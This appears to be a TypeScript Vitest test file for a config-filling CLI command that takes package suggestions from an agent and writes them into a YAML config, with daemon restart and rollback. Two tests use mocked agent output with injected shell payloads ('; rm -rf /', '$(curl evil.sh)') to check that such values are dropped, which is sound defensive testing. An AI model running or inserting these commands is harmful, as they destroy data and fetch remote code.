// SPDX-License-Identifier: Apache-2.0
/**
 * Behavior tests for runToolingFill — the state machine that composes
 * helpers into the `comis config tooling-fill` command.
 *
 * Mocks at the boundary helpers (callAgent, supervisor, atomicWriteFile,
 * writeBackup, isDaemonRunning) and at @comis/core's validateConfig +
 * loadConfigFile. Pure helpers are passed through to the actuals so the
 * doc.toString() YAML round-trip is byte-realistic.
 *
 * Each test constructs a minimal in-memory fixture (yaml string), wires
 * a per-test PromptIO via vi.fn(), invokes runToolingFill, and asserts
 * on the returned `{exitCode, summary}` plus call-order across the
 * mocked boundary helpers.
 *
 * @module
 */

import { vi, describe, it, expect, beforeEach } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { ok, err } from "@comis/shared";

// ---------------------------------------------------------------------------
// Boundary mocks — vi.mock at file-top per AGENTS.md
// ---------------------------------------------------------------------------

vi.mock("./agent-call.js", () => ({
  callAgent: vi.fn(),
}));

vi.mock("./supervisor.js", () => ({
  detectSupervisor: vi.fn(),
  stopDaemon: vi.fn(),
  startDaemon: vi.fn(),
  // Verify-alive poll. Default mock returns ok(undefined) (daemon came
  // up); per-test overrides can return err for the boot-failure
  // scenario. Imported into the test handle below.
  waitForDaemonAlive: vi.fn(),
  MANUAL_RECIPE_HINT:
    "Could not auto-detect daemon supervisor (none of systemctl, pm2, pgrep matched). Run manually: systemctl stop comis && <edit config.yaml> && systemctl start comis. Or pass --restart-cmd \"<full stop+start command>\" to override.",
}));

// Mock the sync-tooling barrel at the boundary fns; pass everything else
// through to the actuals.
vi.mock("../sync-tooling/index.js", async (importOriginal) => {
  const actual =
    await importOriginal<typeof import("../sync-tooling/index.js")>();
  return {
    ...actual,
    atomicWriteFile: vi.fn(),
    writeBackup: vi.fn(),
    isDaemonRunning: vi.fn(),
  };
});

// Mock @comis/core's validateConfig and loadEnvFile/loadConfigFile.
vi.mock("@comis/core", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@comis/core")>();
  return {
    ...actual,
    validateConfig: vi.fn(),
    loadConfigFile: vi.fn(),
    loadEnvFile: vi.fn(() => 0),
  };
});

// Dynamic imports after mocks
const { callAgent } = await import("./agent-call.js");
const { detectSupervisor, stopDaemon, startDaemon, waitForDaemonAlive } = await import(
  "./supervisor.js"
);
const { atomicWriteFile, writeBackup, isDaemonRunning } = await import(
  "../sync-tooling/index.js"
);
const core = await import("@comis/core");
const { runToolingFill } = await import("./orchestrator/index.js");
import type { OrchestratorOpts, PromptIO } from "./orchestrator/index.js";

// ---------------------------------------------------------------------------
// Fixtures + helpers
// ---------------------------------------------------------------------------

const STUB_FIXTURE_YAML = `gateway:
  port: 4766
  token: \${COMIS_GATEWAY_TOKEN}
integrations:
  mcp:
    servers:
      - name: yfinance
        transport: stdio
        command: npx
        args:
          - -y
          - yfinance-mcp-ts
agents:
  default:
    skills:
      discoveryPaths:
        - ./skills
tooling:
  mcp:
    capabilityHints:
      yfinance:
        cluster: data-fetching
        description: TODO
        replacesPackages: []
  skills:
    capabilityHints:
      stub-skill:
        cluster: docs
        description: TODO
        replacesPackages: []
`;

const OPERATOR_FILLED_YFINANCE_YAML = `gateway:
  port: 4766
  token: \${COMIS_GATEWAY_TOKEN}
integrations:
  mcp:
    servers:
      - name: yfinance
        transport: stdio
        command: npx
        args:
          - -y
          - yfinance-mcp-ts
tooling:
  mcp:
    capabilityHints:
      yfinance:
        cluster: data-fetching
        description: my custom description
        replacesPackages:
          - somepkg
`;

const TWO_STUB_HINTS_YAML = `gateway:
  port: 4766
  token: \${COMIS_GATEWAY_TOKEN}
integrations:
  mcp:
    servers:
      - name: yfinance
        transport: stdio
        command: npx
        args:
          - -y
          - yfinance-mcp-ts
      - name: slack-mcp
        transport: stdio
        command: npx
        args:
          - -y
          - slack-mcp
tooling:
  mcp:
    capabilityHints:
      yfinance:
        cluster: data
        description: TODO
        replacesPackages: []
      slack-mcp:
        cluster: chat
        description: TODO
        replacesPackages: []
`;

const ALL_MIXED_YAML = `gateway:
  port: 4766
  token: \${COMIS_GATEWAY_TOKEN}
integrations:
  mcp:
    servers:
      - name: yfinance
        transport: stdio
        command: npx
        args:
          - -y
          - yfinance-mcp-ts
      - name: slack-mcp
        transport: stdio
        command: npx
        args:
          - -y
          - slack-mcp
tooling:
  mcp:
    capabilityHints:
      yfinance:
        cluster: data
        description: TODO
        replacesPackages: []
      slack-mcp:
        cluster: chat
        description: operator wrote this
        replacesPackages:
          - hand-curated-pkg
`;

/**
 * Write a fixture YAML to a tmpdir and return its path. Caller cleans up
 * via afterEach (or relies on os tmpdir cleanup).
 */
function writeFixture(yamlContent: string, name = "config.yaml"): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tooling-fill-test-"));
  const p = path.join(dir, name);
  fs.writeFileSync(p, yamlContent, "utf-8");
  return p;
}

/**
 * Build a baseline OrchestratorOpts; tests override individual fields.
 */
function makeOpts(over: Partial<OrchestratorOpts> = {}): OrchestratorOpts {
  const prompts: PromptIO = {
    confirmValues: vi.fn().mockResolvedValue(true),
    confirmRestart: vi.fn().mockResolvedValue(true),
  };
  return {
    hintName: "yfinance",
    all: false,
    force: false,
    forceNoValidate: false,
    dryRun: false,
    yes: true,
    restart: true,
    restartCmd: undefined,
    configPath: "/dev/null",
    homeDir: os.tmpdir(),
    kindHint: undefined,
    agentId: undefined,
    isTty: true,
    prompts,
    clock: () => new Date("2026-05-10T12:00:00Z"),
    ...over,
  };
}

beforeEach(() => {
  vi.mocked(callAgent).mockReset();
  vi.mocked(detectSupervisor).mockReset();
  vi.mocked(stopDaemon).mockReset();
  vi.mocked(startDaemon).mockReset();
  vi.mocked(waitForDaemonAlive).mockReset();
  vi.mocked(atomicWriteFile).mockReset();
  vi.mocked(writeBackup).mockReset();
  vi.mocked(isDaemonRunning).mockReset();
  vi.mocked(core.validateConfig).mockReset();
  vi.mocked(core.loadConfigFile).mockReset();

  // Default happy-path mocks
  vi.mocked(isDaemonRunning).mockResolvedValue(true);
  vi.mocked(detectSupervisor).mockResolvedValue({ kind: "systemd" });
  vi.mocked(stopDaemon).mockResolvedValue(ok(undefined));
  vi.mocked(startDaemon).mockResolvedValue(ok(undefined));
  vi.mocked(waitForDaemonAlive).mockResolvedValue(ok(undefined));
  vi.mocked(writeBackup).mockReturnValue(
    ok({ backupPath: "/tmp/backup.yaml" }),
  );
  vi.mocked(atomicWriteFile).mockReturnValue(ok(undefined));
  vi.mocked(core.validateConfig).mockReturnValue(
    ok({}) as never,
  );
  vi.mocked(core.loadConfigFile).mockImplementation((p: string) => {
    try {
      const raw = fs.readFileSync(p, "utf-8");
      // Use a non-strict parser for the test config — we just need a JS view
      // for gateway.port / gateway.token; the orchestrator parses the AST
      // separately via parseDocument.
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      const yamlMod = require("yaml") as { parse: (s: string) => unknown };
      return ok(yamlMod.parse(raw)) as never;
    } catch (e) {
      return err({
        code: "FILE_NOT_FOUND",
        message: (e as Error).message,
      }) as never;
    }
  });

  // process.env so the orchestrator can resolve ${COMIS_GATEWAY_TOKEN}
  process.env["COMIS_GATEWAY_TOKEN"] = "test-token";
});

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("runToolingFill — successful single-hint flow with --yes --restart flags", () => {
  it("returns exit 0, calls boundary helpers in correct order, mutates yfinance hint", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance market data\nREPLACES_PACKAGES: ["yfinance", "yahoo-finance2"]',
      }),
    );

    const opts = makeOpts({ configPath });
    const result = await runToolingFill(opts);

    expect(result.exitCode).toBe(0);
    expect(callAgent).toHaveBeenCalledTimes(1);
    expect(writeBackup).toHaveBeenCalledTimes(1);
    expect(writeBackup).toHaveBeenCalledWith(
      configPath,
      opts.homeDir,
      "tooling-fill",
    );
    expect(atomicWriteFile).toHaveBeenCalledTimes(1);
    expect(stopDaemon).toHaveBeenCalledTimes(1);
    expect(startDaemon).toHaveBeenCalledTimes(1);

    // Strict ordering: stopDaemon < writeBackup < atomicWriteFile < startDaemon
    const stopOrder = vi.mocked(stopDaemon).mock.invocationCallOrder[0]!;
    const backupOrder = vi.mocked(writeBackup).mock.invocationCallOrder[0]!;
    const writeOrder = vi.mocked(atomicWriteFile).mock.invocationCallOrder[0]!;
    const startOrder = vi.mocked(startDaemon).mock.invocationCallOrder[0]!;
    expect(stopOrder).toBeLessThan(backupOrder);
    expect(backupOrder).toBeLessThan(writeOrder);
    expect(writeOrder).toBeLessThan(startOrder);

    // The atomicWriteFile call should have the new YAML content with filled fields
    const writtenYaml = vi.mocked(atomicWriteFile).mock.calls[0]![1];
    expect(writtenYaml).toContain("Yahoo Finance market data");
    expect(writtenYaml).toContain("yfinance");
    expect(writtenYaml).toContain("yahoo-finance2");
  });
});

describe("runToolingFill — daemon down → exit 1 with the literal gateway-unreachable message", () => {
  it("emits the exact gateway-unreachable message and never calls callAgent", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(isDaemonRunning).mockResolvedValue(false);

    const result = await runToolingFill(makeOpts({ configPath }));

    expect(result.exitCode).toBe(1);
    expect(result.summary).toContain(
      "Cannot reach Comis daemon — gateway unreachable. Start the daemon and retry.",
    );
    expect(callAgent).not.toHaveBeenCalled();
    expect(stopDaemon).not.toHaveBeenCalled();
    expect(writeBackup).not.toHaveBeenCalled();
    expect(atomicWriteFile).not.toHaveBeenCalled();
  });
});

describe("runToolingFill — --dry-run never stops daemon", () => {
  it("returns exit 0, does NOT stop daemon, does NOT write file", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance market data\nREPLACES_PACKAGES: ["yfinance"]',
      }),
    );

    const result = await runToolingFill(
      makeOpts({ configPath, dryRun: true, restart: true }),
    );

    expect(result.exitCode).toBe(0);
    expect(stopDaemon).not.toHaveBeenCalled();
    expect(writeBackup).not.toHaveBeenCalled();
    expect(atomicWriteFile).not.toHaveBeenCalled();
    expect(startDaemon).not.toHaveBeenCalled();
    // Summary should mention the suggested values
    expect(result.summary).toContain("Yahoo Finance market data");
    expect(result.summary).toContain("yfinance");
  });
});

describe("runToolingFill — idempotency: refuses operator-filled without --force", () => {
  it("exits 1 with 'already filled' message; never stops daemon", async () => {
    const configPath = writeFixture(OPERATOR_FILLED_YFINANCE_YAML);
    // No callAgent mock setup — should not be reached

    const result = await runToolingFill(makeOpts({ configPath }));

    expect(result.exitCode).toBe(1);
    expect(result.summary).toMatch(/already filled.*Use --force/);
    expect(stopDaemon).not.toHaveBeenCalled();
    expect(writeBackup).not.toHaveBeenCalled();
    expect(atomicWriteFile).not.toHaveBeenCalled();
  });
});

describe("runToolingFill — --force overwrites operator-filled hint", () => {
  it("returns exit 0 and writes new values over the operator's", async () => {
    const configPath = writeFixture(OPERATOR_FILLED_YFINANCE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: agent suggestion\nREPLACES_PACKAGES: ["yfinance-new"]',
      }),
    );

    const result = await runToolingFill(
      makeOpts({ configPath, force: true }),
    );

    expect(result.exitCode).toBe(0);
    const writtenYaml = vi.mocked(atomicWriteFile).mock.calls[0]![1];
    expect(writtenYaml).toContain("agent suggestion");
    expect(writtenYaml).toContain("yfinance-new");
    // The operator's values should be replaced
    expect(writtenYaml).not.toContain("my custom description");
    expect(writtenYaml).not.toContain("- somepkg");
  });
});

describe("runToolingFill — non-TTY without --yes → exit 1", () => {
  it("emits '--yes required' and never calls callAgent", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);

    const result = await runToolingFill(
      makeOpts({
        configPath,
        isTty: false,
        yes: false,
        restart: true,
      }),
    );

    expect(result.exitCode).toBe(1);
    expect(result.summary).toContain("--yes required for non-interactive runs");
  });
});

describe("runToolingFill — non-TTY without --restart → exit 1", () => {
  it("emits '--restart required' for non-interactive runs", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance\nREPLACES_PACKAGES: ["yfinance"]',
      }),
    );

    const result = await runToolingFill(
      makeOpts({
        configPath,
        isTty: false,
        yes: true,
        restart: undefined,
      }),
    );

    expect(result.exitCode).toBe(1);
    expect(result.summary).toContain(
      "--restart required for non-interactive runs",
    );
  });
});

describe("runToolingFill — all package names dropped → exit 1", () => {
  it("treats all-dropped as agent failure; does not stop daemon", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Bad agent\nREPLACES_PACKAGES: ["; rm -rf /", "$(curl evil.sh)"]',
      }),
    );

    const result = await runToolingFill(makeOpts({ configPath }));

    expect(result.exitCode).toBe(1);
    expect(stopDaemon).not.toHaveBeenCalled();
    expect(writeBackup).not.toHaveBeenCalled();
    expect(atomicWriteFile).not.toHaveBeenCalled();
  });
});

describe("runToolingFill — some dropped → proceed with valid + warn", () => {
  it("filters dropped names and writes only valid ones", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance\nREPLACES_PACKAGES: ["yfinance", "; rm -rf /"]',
      }),
    );

    const result = await runToolingFill(makeOpts({ configPath }));

    expect(result.exitCode).toBe(0);
    const writtenYaml = vi.mocked(atomicWriteFile).mock.calls[0]![1];
    expect(writtenYaml).toContain("yfinance");
    expect(writtenYaml).not.toContain("rm -rf");
    // Summary should mention the dropped count
    expect(result.summary).toMatch(/dropped 1 invalid/);
  });
});

describe("runToolingFill — validate-failure rollback", () => {
  it("restores backup, restarts daemon, exits 1 with the rollback summary prefix", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance\nREPLACES_PACKAGES: ["yfinance"]',
      }),
    );

    // First validateConfig call (after the mutation) returns err to trigger rollback.
    vi.mocked(core.validateConfig).mockReturnValueOnce(
      err({
        message: "Schema mismatch",
        details: [{ path: ["tooling"], message: "bad" }],
      }) as never,
    );

    const result = await runToolingFill(makeOpts({ configPath }));

    expect(result.exitCode).toBe(1);
    expect(result.summary).toContain("Validation failed; rolled back");
    expect(writeBackup).toHaveBeenCalledTimes(1);
    // atomicWriteFile is called twice: once with the new content, once to restore
    expect(atomicWriteFile).toHaveBeenCalledTimes(2);
    expect(startDaemon).toHaveBeenCalledTimes(1);
  });
});

describe("runToolingFill — --all skips operator-filled silently", () => {
  it("fills only stub hints; --all without --force skips slack-mcp", async () => {
    const configPath = writeFixture(ALL_MIXED_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance\nREPLACES_PACKAGES: ["yfinance"]',
      }),
    );

    const result = await runToolingFill(
      makeOpts({
        configPath,
        all: true,
        hintName: undefined,
      }),
    );

    expect(result.exitCode).toBe(0);
    expect(callAgent).toHaveBeenCalledTimes(1); // only yfinance
    const writtenYaml = vi.mocked(atomicWriteFile).mock.calls[0]![1];
    expect(writtenYaml).toContain("Yahoo Finance");
    // slack-mcp's operator content preserved
    expect(writtenYaml).toContain("operator wrote this");
    expect(writtenYaml).toContain("hand-curated-pkg");
  });
});

describe("runToolingFill — --all partial failure exits 1", () => {
  it("commits filled hints and reports skipped on stderr summary", async () => {
    const configPath = writeFixture(TWO_STUB_HINTS_YAML);
    vi.mocked(callAgent)
      .mockResolvedValueOnce(
        ok({
          response:
            'DESCRIPTION: Yahoo Finance\nREPLACES_PACKAGES: ["yfinance"]',
        }),
      )
      .mockResolvedValueOnce(
        err({
          kind: "timeout",
          status: 0,
          message: "Agent call exceeded 30000ms",
        }),
      );

    const result = await runToolingFill(
      makeOpts({
        configPath,
        all: true,
        hintName: undefined,
      }),
    );

    expect(result.exitCode).toBe(1);
    expect(callAgent).toHaveBeenCalledTimes(2);
    // The atomic write captures the filled state (yfinance) but skips slack-mcp.
    expect(writeBackup).toHaveBeenCalledTimes(1);
    expect(atomicWriteFile).toHaveBeenCalledTimes(1);
    const writtenYaml = vi.mocked(atomicWriteFile).mock.calls[0]![1];
    expect(writtenYaml).toContain("Yahoo Finance");
    // slack-mcp left as TODO (not filled)
    expect(result.summary.toLowerCase()).toContain("filled");
    expect(result.summary.toLowerCase()).toContain("skipped");
    expect(result.summary).toContain("slack-mcp");
  });
});

describe("runToolingFill — supervisor detection failure", () => {
  it("exits 1 with MANUAL_RECIPE_HINT; does not stop daemon", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance\nREPLACES_PACKAGES: ["yfinance"]',
      }),
    );
    vi.mocked(detectSupervisor).mockResolvedValue({ kind: "none" });

    const result = await runToolingFill(makeOpts({ configPath }));

    expect(result.exitCode).toBe(1);
    expect(result.summary).toContain("Could not auto-detect daemon supervisor");
    expect(stopDaemon).not.toHaveBeenCalled();
    expect(writeBackup).not.toHaveBeenCalled();
  });
});

describe("runToolingFill — skills hint", () => {
  it("fills tooling.skills.capabilityHints.<name> when kindHint='skills'", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Refined skill description\nREPLACES_PACKAGES: []',
      }),
    );

    const result = await runToolingFill(
      makeOpts({
        configPath,
        hintName: "stub-skill",
        kindHint: "skills",
      }),
    );

    expect(result.exitCode).toBe(0);
    const writtenYaml = vi.mocked(atomicWriteFile).mock.calls[0]![1];
    expect(writtenYaml).toContain("Refined skill description");
    // mcp.yfinance untouched
    expect(writtenYaml).toContain("description: TODO");
  });
});

describe("runToolingFill — call-order strict invariant", () => {
  it("executes runToolingFill steps in order: stopDaemon < writeBackup < atomicWriteFile < startDaemon", async () => {
    const configPath = writeFixture(STUB_FIXTURE_YAML);
    vi.mocked(callAgent).mockResolvedValue(
      ok({
        response:
          'DESCRIPTION: Yahoo Finance\nREPLACES_PACKAGES: ["yfinance"]',
      }),
    );

    await runToolingFill(makeOpts({ configPath }));

    const stopOrder = vi.mocked(stopDaemon).mock.invocationCallOrder[0]!;
    const backupOrder = vi.mocked(writeBackup).mock.invocationCallOrder[0]!;
    const writeOrder = vi.mocked(atomicWriteFile).mock.invocationCallOrder[0]!;
    const startOrder = vi.mocked(startDaemon).mock.invocationCallOrder[0]!;
    expect(stopOrder).toBeLessThan(backupOrder);
    expect(backupOrder).toBeLessThan(writeOrder);
    expect(writeOrder).toBeLessThan(startOrder);
    // callAgent must precede stopDaemon — daemon up for LLM call
    const callOrder = vi.mocked(callAgent).mock.invocationCallOrder[0]!;
    expect(callOrder).toBeLessThan(stopOrder);
  });
});
